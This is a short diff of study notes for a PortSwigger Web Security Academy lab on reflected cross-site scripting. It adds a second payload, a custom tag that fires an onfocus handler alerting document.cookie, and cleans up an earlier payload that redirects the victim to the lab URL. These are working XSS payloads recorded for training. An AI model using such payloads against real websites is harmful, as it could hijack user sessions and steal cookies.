@@ -26,9 +26,10 @@
 	Method: Use your server to host a site that accesses JS from the vulnerable page and 
 	embed your payload in the request to the vulnerable page.
 	
-	Payload: <script>
-	location = 'https://0a7100f703afb15f809d1c51002f004b.web-security-academy.net/?							search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+	Payload1: <script>
+	location = 'https://0a7100f703afb15f809d1c51002f004b.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
 	</script>
+	Payload2: <xss autofocus onfocus=alert(document.cookie) tabindex=1>
 
 
 ------> Lab: Reflected XSS with event handlers and href attributes blocked
